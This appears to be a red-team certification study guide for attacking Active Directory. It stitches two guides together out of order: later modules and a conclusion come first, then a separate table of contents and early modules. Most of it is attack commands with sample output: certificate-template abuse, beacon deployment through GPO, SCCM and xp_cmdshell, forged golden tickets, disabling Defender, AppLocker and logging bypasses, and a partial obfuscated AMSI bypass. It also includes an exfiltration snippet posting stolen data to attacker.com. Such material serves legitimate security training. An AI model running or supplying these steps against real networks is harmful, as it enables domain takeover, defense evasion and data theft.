# Right-click beacon → Pivot → SOCKS Server
# Listening on 0.0.0.0:1080 (local)

# Configure proxychains on attacker machine
cat /etc/proxychains4.conf | tail -5
# OUTPUT:
# socks5  127.0.0.1  1080

# Route traffic through beacon
proxychains nmap -sV 10.0.0.0/24 -p 80,443,3389 --open
# OUTPUT:
# PORT    STATE  SERVICE  VERSION
# 10.0.0.5:80  open   http     Microsoft IIS 10.0
# 10.0.0.10:443  open   https    Microsoft IIS 10.0
# 10.0.0.12:3389  open   ms-wbt-server  Windows RDP
# 10.0.0.50:3306  open   mysql    MySQL 5.7.30

# Discover new internal targets via pivoting
```



---

## MODULE 18: Active Directory Certificate Services

### ESC1 Vulnerable Template Exploitation

**Abuse misconfigured certificate template for DA compromise:**

```powershell
# Find vulnerable certificate templates
.\Certify.exe find /enrolleeSuppliesSubject
# OUTPUT:
# [!] Vulnerable Template(s):
# [*] Template Name: User-Enrollment
#     msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME
#     msPKI-Enrollment-Flag: AUTOENROLLMENT_ALLOWED
#     [+] This template allows low-privilege users to enroll!

# Request certificate as Administrator (via template vulnerability)
.\Certify.exe request /ca:ca.example.com\ca-name /template:User-Enrollment /altname:Administrator
# OUTPUT:
# [+] Request submitted successfully
# [+] Request ID: 25
# [+] Certificate issued!
# [+] Certificate written to cert.pem

# Convert to usable format
openssl pkcs12 -export -in cert.pem -out cert.pfx -certfile cacert.crt
# Enter Export Password: (set password)
```



---

## MODULE 19: Group Policy

### GPO Scheduled Task Abuse

**Deploy malware via Group Policy:**

```powershell
# If you have write access to domain GPO:
# Create new GPO
New-GPO -Name "Security Update" -Comment "Critical patches"
# OUTPUT:
# DisplayName      : Security Update
# GpoStatus        : AllSettingsEnabled
# Owner            : EXAMPLE\Administrator

# Link GPO to Organizational Unit
New-GPLink -Name "Security Update" -Target "OU=Workstations,DC=example,DC=com"

# Modify GPO to deploy scheduled task
# Group Policy Editor → Computer Configuration → Preferences → Control Panel Settings → Scheduled Tasks
# Create new scheduled task:
# Task Name: Windows Update Service
# Run: C:\temp\beacon.exe
# Run as: SYSTEM
# Trigger: User logon

# Force Group Policy refresh
gpupdate /force /target:computer

# All users logging into machines in that OU execute beacon.exe as SYSTEM
```



---

## MODULE 20: MS SQL Servers

### SQL Server Lateral Movement

**Use SQL server for domain network access:**

```powershell
# Find SQL servers in domain
Get-ADComputer -Filter * | Where-Object {$_.Name -like "*SQL*"}
# OUTPUT:
# Name  DNSHostName          OperatingSystem
# SQL1  sql1.example.com     Windows Server 2019

# Connect to SQL Server
sqlcmd -S sql1.example.com -U sa -P password
# OUTPUT:
# 1>

# Enable xp_cmdshell (if disabled)
1> EXEC sp_configure 'show advanced options', 1;
2> RECONFIGURE;
3> EXEC sp_configure 'xp_cmdshell', 1;
4> RECONFIGURE;
5> GO

# Execute OS commands
1> EXEC xp_cmdshell 'C:\temp\beacon.exe';
2> GO

# New beacon appears from SQL server context
```



---

## MODULE 21: Microsoft Configuration Manager

### MECM Client Compromise

**Use SCCM client for domain-wide malware distribution:**

```powershell
# Enumerate MECM infrastructure
Get-WmiObject -Namespace "root\sms" -Class "__Namespace" -Filter "Name like 'SMS%'"
# OUTPUT:
# Name    Path
# SMS_SITE root\sms\site_ABC

# Access MECM database
$sccmServer = Get-SmsProvider -Computer "sccm.example.com"

# Create malicious package in MECM
New-CMPackage -Name "Security Hotfix" -Path "\\sccm\deploy\beacon.exe"

# Deploy to all domain computers
Set-CMPackageDistribution -PackageName "Security Hotfix" -DeploymentTarget "All Clients"

# All SCCM clients execute beacon.exe within next policy refresh cycle
# (15 minutes default)
```



---

## MODULE 22: Domain Dominance

### Achieving Domain Administrator

**Full domain control achieved through exploitation chain:**

```powershell
# Multiple attack paths lead to DA:

# Path 1: Kerberoasting → Crack password → Service account → Lateral movement → DA
# Path 2: Unconstrained delegation → Printer bug → DA TGT theft → DA
# Path 3: ACL abuse → Reset DA password → Direct login
# Path 4: Group Policy abuse → Deploy malware to DA machines → Token impersonation

# Verify DA access:
shell net group "Domain Admins" /domain
# OUTPUT:
# Group name Domain Admins
# Comment Designated administrators of the domain
# 
# Members
# -------
# Administrator          (original DA account)
# svcadmin              (service account DA member)
# jane.doe              (our compromised user, now added to DA!)

# Prove access with domain controller access
shell ls \\DC1\c$
# OUTPUT:
# Directory of \\DC1\c$
# 
# 08/04/2024  14:30    <DIR>  .
# 08/04/2024  14:30    <DIR>  ..
# 08/04/2024  14:30    <DIR>  Windows
# 08/04/2024  14:30    <DIR>  Users
# 08/04/2024  14:30    <DIR>  Program Files
```


---

## MODULE 23: Forest & Domain Trusts

### Child to Parent Domain Escalation

**Compromise entire forest from child domain DA:**

```powershell
# From child domain DA, extract krbtgt hash
invoke-mimikatz -Command '"lsadump::dcsync /user:child\krbtgt"'
# OUTPUT:
# Domain: child.example.com
# User: krbtgt
# SID: S-1-5-21-child-SID-502
# NTLM: 7a1c3e5d8f2b4a6c9e1d3f5a7b9c1e3d
# AES256: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z

# Get forest root domain SID
nltest /dclist:example.com
# OUTPUT:
# DC1.example.com [PDC]
# DC2.example.com [GC]
# DC3.example.com

# Get Enterprise Admins SID
Get-ADGroup "Enterprise Admins" -Server example.com | select SID
# OUTPUT:
# S-1-5-21-root-SID-519  (519 = Enterprise Admins RID)

# Create trust exploitation ticket (SID history injection)
.\Rubeus.exe golden /domain:child.example.com /sid:S-1-5-21-child-SID `
  /sids:S-1-5-21-root-SID-519 /krbtgt:7a1c3e5d8f2b4a6c9e1d3f5a7b9c1e3d /ptt
# OUTPUT:
# [+] Ticket created successfully
# [+] Ticket injected into current session

# Access forest root DC
shell ls \\root-dc.example.com\c$
# OUTPUT:
# Directory of \\root-dc.example.com\c$
# [Successfully accessed - forest compromised!]
```


---

## MODULE 24: LAPS Exploitation

### LAPS Password Extraction

**Read or bypass Local Administrator Password Solution:**

```powershell
# Check LAPS implementation
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime | Select Name, ms-Mcs-AdmPwdExpirationTime
# OUTPUT:
# Name     ms-Mcs-AdmPwdExpirationTime
# WS001    131456789012345670
# WS002    131456790012345670

# Extract LAPS password (if you have read permission)
Get-ADComputer -Identity WS001 -Properties "ms-Mcs-AdmPwd" | Select -ExpandProperty "ms-Mcs-AdmPwd"
# OUTPUT:
# g7xK#pL9@mQ2$vR5&wS8!yT1*zU4(aV3)

# Use LAPS password for local admin access
$cred = New-PSCredential -UserName "administrator" -Password (ConvertTo-SecureString "g7xK#pL9@mQ2$vR5&wS8!yT1*zU4(aV3)" -AsPlainText -Force)
Invoke-Command -ComputerName WS001 -Credential $cred -ScriptBlock { whoami /priv }
```



---

## MODULE 25: Defender Evasion

### Signature-Based Bypass

**Evade Windows Defender detection:**

```powershell
# Check current Defender status
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, IsTamperProtected
# OUTPUT:
# RealTimeProtectionEnabled : True
# IsTamperProtected : True

# Disable real-time monitoring (requires System or admin)
Set-MpPreference -DisableRealtimeMonitoring $true -Force
# OUTPUT:
# [+] Real-time protection disabled

# Verify bypass
Get-MpPreference | Select-Object RealtimeMonitoringEnabled
# OUTPUT:
# RealtimeMonitoringEnabled : False

# Deploy tools without detection
copy C:\temp\beacon.exe C:\Windows\System32\beacon.exe

# Restore monitoring
Set-MpPreference -DisableRealtimeMonitoring $false
```


---

## MODULE 26: Application Whitelisting

### AppLocker Bypass via LOLBins

**Bypass Windows application whitelisting restrictions:**

```powershell
# Identify AppLocker rules in effect
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
# OUTPUT:
# RuleCollectionType : Executable
# Rules : {...}
# [PowerShell scripts are blocked]
# [Executables from C:\Program Files allowed]
# [cmd.exe blocked]

# Bypass: Use allowed process to run our code
# Method 1: cmd.exe via rundll32 (rundll32.exe usually allowed)
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";alert(eval('(new Function("return (new ActiveXObject(\"WScript.Shell\")).Exec(\"C:\\\\temp\\\\beacon.exe\").StdOut.ReadAll()")())'));

# Method 2: PowerShell via mshta
mshta vbscript:Close(Execute("powershell.exe -enc <BASE64_BEACON_LOADER>"))

# Method 3: cscript via approved location
copy C:\temp\beacon.ps1 "C:\Program Files\Common Files\beacon.ps1"
cscript.exe C:\Windows\System32\WScript.Host "C:\Program Files\Common Files\beacon.ps1"
```


---

## MODULE 27: Data Hunting & Exfiltration

### Sensitive File Discovery

**Locate and extract high-value data:**

```powershell
# Search for sensitive files across domain
Get-ChildItem -Recurse -Path "\\server\share" -Include "*.xlsx","*.docx","*.pdf" -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-30)}
# OUTPUT:
# Mode LastWriteTime     Length Name
# ---- ---------------  ------ ----
# -a--- 7/3/2024 2:15 PM 542800 Q3_Financial_Results.xlsx
# -a--- 7/2/2024 4:30 PM 1850400 Customer_List_2024.docx
# -a--- 7/1/2024 9:45 AM 2345600 Acquisition_Plan_CONFIDENTIAL.pdf

# Search for password patterns
Get-ChildItem -Recurse | Select-String -Pattern "password\s*=|pwd\s*=|secret\s*="
# OUTPUT:
# config.ini:15:database_password=Pr0duction!2024
# settings.xml:42:api_secret=sk_live_xxxxxxxxxxxxx
# app.config:67:sql_password=DataB@se123!
```



### Data Exfiltration

```powershell
# Compress sensitive data
Compress-Archive -Path "\\server\share\confidential" -DestinationPath C:\temp\data.zip

# Exfiltrate via HTTPS (encrypted)
$data = [System.IO.File]::ReadAllBytes("C:\temp\data.zip")
$base64 = [System.Convert]::ToBase64String($data)
Invoke-WebRequest -Uri "http://attacker.com/exfil" -Method POST -Body @{data=$base64}

# Alternative: DNS exfiltration (if HTTP blocked)
# Encode data in DNS queries to attacker nameserver
# nslookup <base64_encoded_data>.attacker.com
```



---

## MODULE 28: Extending Cobalt Strike

### Custom Beacon Object File (BOF)

**Extend Cobalt Strike with custom C code:**

```c
// custom_enumeration.c - Custom system enumeration BOF
#include <windows.h>
#include "beacon.h"

// Forward declarations
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$QueryFullProcessImageNameA(HANDLE hProcess, DWORD dwFlags, LPSTR lpExeName, PDWORD lpdwSize);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);

void go(char * args, int len) {
    DWORD processes[1024];
    DWORD needed;
    DWORD count;
    int i;
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Enumerating processes...");
    
    // Get process list (custom enumeration)
    if (!KERNEL32$EnumProcesses(processes, sizeof(processes), &needed)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enumerate processes");
        return;
    }
    
    count = needed / sizeof(DWORD);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found %d processes", count);
    
    // Print first 10 PIDs
    for (i = 0; i < (count < 10 ? count : 10); i++) {
        BeaconPrintf(CALLBACK_OUTPUT, "    PID: %d", processes[i]);
    }
}
```



---



## Conclusion

The Certified Red Team Operator (CRTO) certification represents mastery of:
- **C2 Framework Mastery** (Cobalt Strike)
- **Operational Security** (OPSEC)
- **Evasion Techniques** (Detection bypass)
- **Post-Exploitation** (Persistence, lateral movement)
- **Domain Exploitation** (Active Directory attacks)
- **Advanced Techniques** (BOF development, tool extension)

This guide provides the foundational knowledge. Success requires:
1. **Hands-on practice** in lab environment
2. **Continuous learning** from mistakes
3. **Detailed documentation** of attacks
4. **Professional reporting** of findings
5. **Understanding why**, not just "how"

**Red Team Operations require discipline, patience, and meticulous documentation.**

Good luck with your red team operations.

---

CRTO | Zero Point Security | “The goal is not to get Domain Admin. The goal is to understand WHY you got Domain Admin.”

By DarcHacker.

**LinkedIn:** [Mostafa Ibrahim](https://www.linkedin.com/in/mostafa-ibrahim-60b543341)  

##  Table of Contents

| # | Module | Key Topics |
|---|--------|-----------|
| 00 | [Lab Setup & Methodology](#00-lab-setup--methodology) | Invisi-Shell, AMSI, OpSec |
| 01 | [AD Enumeration — PowerView](#01-ad-enumeration--powerview) | Users, groups, GPO, ACL, trusts |
| 02 | [AD Enumeration — AD Module](#02-ad-enumeration--ad-module) | Native cmdlets, no extra tools |
| 03 | [AD Enumeration — BloodHound](#03-ad-enumeration--bloodhound) | SharpHound, attack paths |
| 04 | [Offensive PowerShell Tradecraft](#04-offensive-powershell-tradecraft) | AMSI bypass, CLM, logging bypass |
| 05 | [Offensive .NET Tradecraft](#05-offensive-net-tradecraft) | Loaders, in-memory execution, MDE |
| 06 | [Local Privilege Escalation](#06-local-privilege-escalation) | PowerUp, services, registry, apps |
| 07 | [Lateral Movement](#07-lateral-movement) | PSRemoting, WMI, WinRM, PsExec |
| 08 | [Domain Privilege Escalation — Kerberoasting](#08-domain-privilege-escalation--kerberoasting) | SPNs, TGS, hashcat |
| 09 | [Domain Privilege Escalation — AS-REP Roasting](#09-domain-privilege-escalation--as-rep-roasting) | No preauth, hash crack |
| 10 | [Domain Privilege Escalation — Unconstrained Delegation](#10-domain-privilege-escalation--unconstrained-delegation) | TGT extraction, PrintSpooler |
| 11 | [Domain Privilege Escalation — Constrained Delegation](#11-domain-privilege-escalation--constrained-delegation) | S4U2Self, S4U2Proxy, Rubeus |
| 12 | [Domain Privilege Escalation — RBCD](#12-domain-privilege-escalation--resource-based-constrained-delegation) | Computer object abuse |
| 13 | [Domain Privilege Escalation — ACL Abuse](#13-domain-privilege-escalation--acl-abuse) | GenericAll, WriteDACL, ForceChangePassword |
| 14 | [Domain Privilege Escalation — DNS Admins](#14-domain-privilege-escalation--dns-admins) | DLL injection via DNS |
| 15 | [Credential Theft & Mimikatz](#15-credential-theft--mimikatz) | LSASS, SAM, logon passwords |
| 16 | [Domain Persistence — Golden Ticket](#16-domain-persistence--golden-ticket) | krbtgt abuse |
| 17 | [Domain Persistence — Silver Ticket](#17-domain-persistence--silver-ticket) | Service TGS forgery |
| 18 | [Domain Persistence — Diamond Ticket](#18-domain-persistence--diamond-ticket) | Modify existing TGT |
| 19 | [Domain Persistence — Skeleton Key](#19-domain-persistence--skeleton-key) | Universal password backdoor |
| 20 | [Domain Persistence — DSRM](#20-domain-persistence--dsrm) | DC local admin abuse |
| 21 | [Domain Persistence — Custom SSP](#21-domain-persistence--custom-ssp) | Track logons, credential capture |
| 22 | [Domain Persistence — ACL Backdoors](#22-domain-persistence--acl-backdoors) | AdminSDHolder, DCSync rights |
| 23 | [Domain Persistence — Security Descriptors](#23-domain-persistence--security-descriptors) | WMI, PSRemoting, RemoteReg |
| 24 | [Cross-Domain Attacks — Child to Forest Root](#24-cross-domain-attacks--child-to-forest-root) | Trust tickets, krbtgt hash |
| 25 | [Cross-Forest Trust Attacks](#25-cross-forest-trust-attacks) | SID history, inter-forest TGT |
| 26 | [MSSQL Server Attacks](#26-mssql-server-attacks) | PowerUpSQL, linked servers, xp_cmdshell |
| 27 | [Defenses & Detection Bypasses](#27-defenses--detection-bypasses) | MDI, Defender, logging |
| 28 | [Sliver C2 Framework](#28-sliver-c2-framework) | Beacons, pivoting, operations |
| 29 | [Essential Resources & Links](#29-essential-resources--links) | Tools, websites, references |

---

## 00 Lab Setup & Methodology

### The CRTP Assumed Breach Model

```
╔═══════════════════════════════════════════════════════════════╗
║  You START as a low-privilege domain user                     ║
║  on a domain-joined machine.                                  ║
║                                                               ║
║  The goal: escalate privileges, move laterally,               ║
║  and compromise the entire forest.                            ║
║                                                               ║
║  Rule: NO unpatched CVE exploits.                             ║
║        Abuse FEATURES and MISCONFIGURATIONS only.             ║
╚═══════════════════════════════════════════════════════════════╝

Lab Environment:
  student.dollarcorp.moneycorp.local   ← your foothold
        │
        ├── dollarcorp.moneycorp.local   (child domain)
        │         └── Domain Controller: dcorp-dc
        │
        ├── moneycorp.local             (forest root)
        │         └── Domain Controller: mcorp-dc
        │
        └── eurocorp.local              (external trust)
                  └── Domain Controller: eu-dc
```

### Initial Access — Lab Connection

```bash
# Option 1: Web browser via Guacamole (no VPN needed)
# Access: https://enterprisesecurity.io

# Option 2: OpenVPN
sudo openvpn studentXX.ovpn
# Then RDP to student machine:
xfreerdp /v:<STUDENT_IP> /u:student1 /p:password /dynamic-resolution /drive:tools,/opt/crtp-tools
```

### Invisi-Shell (Bypass PS Logging)

```powershell
# Invisi-Shell hooks .NET assemblies to bypass:
# - Script Block Logging
# - Module Logging
# - Transcription
# - Anti-Malware Scan Interface (AMSI) via hook

# Run as normal user:
C:\AD\Tools\InvisiShell\RunWithRegistryNonAdmin.bat

# Run as admin:
C:\AD\Tools\InvisiShell\RunWithPathedAdmin.bat

# What it does:
# Creates a COM server that intercepts PowerShell's scripting engine
# so all PS activity goes unlogged. Run ALL tools from an Invisi-Shell session.

# Screenshot reference: After running the .bat, notice the PS prompt
# no longer has the ">" sign changed - but logging is now disabled.
```

### Methodology — Attack Path

```
STEP 1: Bypass Defenses (AMSI, logging)
STEP 2: Enumerate everything (users, groups, ACLs, trusts, GPOs, SPNs)
STEP 3: Map attack paths (BloodHound)
STEP 4: Identify low-hanging fruit (Kerberoastable, delegation, ACL misconfigs)
STEP 5: Local privilege escalation (if needed)
STEP 6: Lateral movement (reach other machines)
STEP 7: Domain privilege escalation (become DA)
STEP 8: Persist in domain (Golden Ticket, ACL backdoors)
STEP 9: Cross domain / forest escalation (Enterprise Admin)
STEP 10: Document everything — submit report
```

---

## 01 AD Enumeration — PowerView

> PowerView is the primary enumeration tool in CRTP.
> Load it inside an Invisi-Shell session to bypass AMSI.

### Loading PowerView

```powershell
# Load PowerView (inside Invisi-Shell session)
. C:\AD\Tools\PowerView.ps1

# If AMSI blocks it, bypass first (see Module 04), then load:
. C:\AD\Tools\PowerView.ps1

# PowerView source: https://github.com/PowerShellMafia/PowerSploit
```

### Domain Enumeration

```powershell
# ── Domain Info ──────────────────────────────────────────────────────────
Get-Domain
Get-Domain -Domain moneycorp.local          # Enumerate another domain

Get-DomainController
Get-DomainController -Domain moneycorp.local

Get-DomainPolicy
(Get-DomainPolicy)."system access"          # Password policy
(Get-DomainPolicy)."kerberos policy"        # Kerberos ticket settings

# Domain SID (needed for Golden/Silver tickets)
Get-DomainSID
```

### User Enumeration

```powershell
# ── All Users ────────────────────────────────────────────────────────────
Get-DomainUser
Get-DomainUser -Identity student1
Get-DomainUser | select -ExpandProperty samaccountname

# Key user properties to check:
Get-DomainUser | select samaccountname, description, memberof, pwdlastset, lastlogon

# Users with no password expiry (interesting for persistence):
Get-DomainUser -UACFilter DONT_EXPIRE_PASSWORD | select samaccountname

# Users with passwords never changed:
Get-DomainUser | where {$_.pwdlastset -eq 0} | select samaccountname

# Users with description containing "pass" (admins often leave creds here!):
Get-DomainUser | where {$_.description -like "*pass*"} | select samaccountname,description

# Actively logged on users (needs admin on target):
Get-LoggedOnLocal -ComputerName dcorp-adminsrv

# Recently logged on users:
Get-LastLoggedOn -ComputerName dcorp-adminsrv

# Find where a specific user is logged in:
Find-DomainUserLocation -UserIdentity "Domain Admins"
Find-DomainUserLocation -UserIdentity "svcadmin"
```

### Computer Enumeration

```powershell
Get-DomainComputer | select name, operatingsystem, dnshostname
Get-DomainComputer | select -ExpandProperty dnshostname

# Computers with specific OS
Get-DomainComputer -OperatingSystem "*Server 2022*"

# Test connectivity
Get-DomainComputer | Test-Connection -Count 1 -ErrorAction SilentlyContinue

# Ping sweep against all domain computers
Get-DomainComputer | select dnshostname | ForEach-Object {
  Test-Connection -ComputerName $_.dnshostname -Count 1 -Quiet 2>$null
}
```

### Group Enumeration

```powershell
# All groups
Get-DomainGroup | select name, description

# Members of Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins" -Recurse   # Nested groups

# All groups a user is member of
Get-DomainGroup -UserName student1 | select name

# Members of Enterprise Admins (forest root)
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local

# Local group membership (admin rights on machines)
Get-NetLocalGroupMember -ComputerName dcorp-adminsrv -GroupName Administrators
```

### Local Admin Hunting

```powershell
# Find all machines where current user has local admin
Find-LocalAdminAccess
Find-LocalAdminAccess -Verbose

# Find machines where Domain Admins are logged in
Find-DomainUserLocation

# Where can we PSRemote?
$computers = Get-DomainComputer | select -ExpandProperty dnshostname
foreach($c in $computers) {
    $result = Invoke-Command -ComputerName $c -ScriptBlock {whoami} -ErrorAction SilentlyContinue
    if($result) { Write-Host "[+] PSRemote: $c — $result" }
}

# Invoke-UserHunter (find DA sessions)
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
Invoke-UserHunter -Stealth    # Less noisy, queries fewer machines
```

### GPO Enumeration

```powershell
# All Group Policy Objects
Get-DomainGPO | select displayname, gpcfilesyspath
Get-DomainGPO -ComputerIdentity dcorp-adminsrv | select displayname   # GPOs applied to machine
Get-DomainGPO -UserIdentity student1 | select displayname             # GPOs applied to user

# GPO-based restricted groups (gives local admin)
Get-DomainGPOLocalGroup
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GroupMembers

# Computers where a user has local admin via GPO
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators -Identity student1
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-adminsrv
```

### Organizational Unit (OU) Enumeration

```powershell
Get-DomainOU
Get-DomainOU | select name
Get-DomainOU -Identity StudentMachines | select -ExpandProperty distinguishedname

# What GPO is applied to an OU?
(Get-DomainOU -Identity StudentMachines).gplink
```

### Share Enumeration

```powershell
# Find shares (can be noisy)
Find-DomainShare
Find-DomainShare -CheckShareAccess    # Only return accessible ones

# Find interesting files on shares
Find-InterestingDomainShareFile -Include *.txt, *.ps1, *.bat, *.xml, *.conf, *.config
Find-InterestingDomainShareFile -SharePath "\\dcorp-dc\sysvol"
```

### ACL Enumeration (Critical for CRTP)

```powershell
# Get all ACLs for a user (what rights does the user have on which objects?)
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Find INTERESTING/abusable ACLs in the entire domain
# This is the MOST IMPORTANT enumeration in CRTP:
Find-InterestingDomainAcl -ResolveGUIDs

# Filter for specific rights:
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "GenericAll"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "WriteDACL"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "WriteOwner"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "GenericWrite"}

# Rights to look for (in order of importance):
# GenericAll       → Full control over the object
# GenericWrite     → Write to object attributes
# WriteDACL        → Modify the object's ACL (can grant yourself GenericAll)
# WriteOwner       → Change ownership (then modify ACL)
# ForceChangePassword → Change user's password without knowing current
# AllExtendedRights   → Includes DCSync, reset passwords
# Self             → Write to specific attributes

# Check ACLs of domain object (DCSync rights):
Get-DomainObjectAcl -Identity "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{
    ($_.ObjectAceType -match "Replication-Get") -and ($_.ActiveDirectoryRights -match "ExtendedRight")
}
```

### Trust Enumeration

```powershell
# Domain trusts
Get-DomainTrust
Get-DomainTrust -Domain moneycorp.local

# Forest trusts
Get-ForestTrust
Get-ForestDomain -Verbose
Get-ForestDomain | Get-DomainTrust

# Map all trusts (visual)
Get-ForestDomain | Get-DomainTrust | select SourceName,TargetName,TrustDirection,TrustType

# Trust directions:
# Bidirectional   = both domains trust each other
# Inbound         = THIS domain is trusted by target
# Outbound        = THIS domain trusts target
# Transitive      = trust extends through domain hierarchy

# External trusts (to eurocorp.local)
Get-DomainTrust -Domain eurocorp.local

# SID Filtering status (important for cross-forest attacks)
Get-DomainTrust | select SourceName,TargetName,TrustAttributes
# FILTER_SIDS = SID filtering enabled (blocks SID history injection)
# If NOT set = SID history attacks work across trust
```

---

## 02 AD Enumeration — AD Module

> Built-in AD module — already signed by Microsoft, less likely to trigger alerts.
> No need to bypass AMSI for these cmdlets.

### Loading the AD Module

```powershell
# The AD module needs to be imported (it IS available on domain-joined Windows):
Import-Module ActiveDirectory

# Alternatively, load without installation:
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

### Core Enumeration Commands

```powershell
# ── Domain ────────────────────────────────────────────────────────────────
Get-ADDomain
Get-ADDomain -Identity moneycorp.local
Get-ADForest
Get-ADForest -Identity moneycorp.local
Get-ADTrust -Filter *
Get-ADTrust -Server moneycorp.local -Filter *

# ── Users ─────────────────────────────────────────────────────────────────
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *
Get-ADUser -Filter * | select SamAccountName, Description, MemberOf

# Users with Kerberos preauth disabled (AS-REP roastable):
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

# Users with SPN set (Kerberoastable):
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# ── Computers ─────────────────────────────────────────────────────────────
Get-ADComputer -Filter * | select Name,OperatingSystem,DNSHostName
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}

# Computers with unconstrained delegation:
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}

# Computers with constrained delegation:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# ── Groups ────────────────────────────────────────────────────────────────
Get-ADGroup -Filter * | select Name, GroupScope, GroupCategory
Get-ADGroupMember -Identity "Domain Admins" -Recursive | select Name
Get-ADGroupMember -Identity "Enterprise Admins" | select Name

# ── Password Policy ───────────────────────────────────────────────────────
Get-ADDefaultDomainPasswordPolicy
(Get-ADDomain).MinPasswordLength
```

---

## 03 AD Enumeration — BloodHound

> BloodHound is the most powerful tool for visualizing attack paths in Active Directory.
> CRTP requires SharpHound for collection and BloodHound GUI for analysis.

### SharpHound Data Collection

```powershell
# Run SharpHound on victim machine (from Invisi-Shell session):
. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1

# Full collection (most data):
Invoke-BloodHound -CollectionMethod All -Verbose

# Stealth collection (less noisy):
Invoke-BloodHound -CollectionMethod All -ExcludeDC

# Specific collections:
Invoke-BloodHound -CollectionMethod DCOnly               # DC queries only
Invoke-BloodHound -CollectionMethod Group                # Group memberships
Invoke-BloodHound -CollectionMethod LocalAdmin           # Local admin rights
Invoke-BloodHound -CollectionMethod Session              # Active sessions
Invoke-BloodHound -CollectionMethod Trusts               # Domain trusts

# Output: creates a .zip file in current directory
# Transfer to Kali and import into BloodHound GUI

# SharpHound.exe (binary, better for evasion):
.\SharpHound.exe -c All --zipfilename bh_data.zip
.\SharpHound.exe -c All --stealth --zipfilename bh_data.zip
```

### BloodHound Setup on Kali

```bash
# Start Neo4j database
sudo neo4j start
# Access: http://localhost:7474
# Default: neo4j / neo4j — CHANGE PASSWORD on first login

# Start BloodHound
bloodhound &
# Login with Neo4j credentials

# Import data: drag .zip file into BloodHound window
```

### Critical BloodHound Queries for CRTP

```
╔═══════════════════════════════════════════════════════╗
║  PRE-BUILT QUERIES (click "Analysis" tab):           ║
╠═══════════════════════════════════════════════════════╣
║  Find Shortest Paths to Domain Admins                ║
║  Find All Domain Admins                              ║
║  Find Principals with DCSync Rights                  ║
║  List All Kerberoastable Accounts                    ║
║  Find AS-REP Roastable Users                         ║
║  Shortest Paths from Owned Principals                ║
║  Computers where Domain Users are Local Admins       ║
║  Find Computers with Unconstrained Delegation        ║
╚═══════════════════════════════════════════════════════╝
```

```cypher
-- Custom Cypher queries in BloodHound search box:

-- Find all paths from student1 to Domain Admins
MATCH p=shortestPath((u:User {name:"STUDENT1@DOLLARCORP.MONEYCORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOLLARCORP.MONEYCORP.LOCAL"})) RETURN p

-- Find computers with unconstrained delegation (not DCs)
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name ENDS WITH "DC" RETURN c

-- Find users with Kerberoastable accounts
MATCH (u:User {hasspn:true}) RETURN u.name

-- Find AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

-- Find all ACL paths to DA
MATCH p=(u:User)-[r:GenericAll|GenericWrite|WriteDACL|WriteOwner|ForceChangePassword|AllExtendedRights]->(d:Domain) RETURN p

-- What can student1 do?
MATCH p=(u:User {name:"STUDENT1@DOLLARCORP.MONEYCORP.LOCAL"})-[r]->(n) RETURN p
```

### Marking Owned Principals

```
1. Right-click any node in BloodHound
2. Select "Mark User as Owned" or "Mark Computer as Owned"
3. Run "Shortest Paths from Owned Principals" query
4. BloodHound shows ALL paths from owned objects to Domain Admins
```

---

## 04 Offensive PowerShell Tradecraft

### AMSI Bypass

> AMSI (Anti-Malware Scan Interface) intercepts all PowerShell input and passes it to Windows Defender.
> These bypasses patch AMSI in memory so scripts are not scanned.

```powershell
# ── BYPASS 1: Reflection (most common in CRTP labs) ──────────────────────
# Obfuscated to avoid AMSI detecting the bypass itself:
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) (
[TYpE]( "{1}{0}"-F'F','rE' ) );
(
Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL
)."A`ss`Embly"."GET`TY`Pe"((
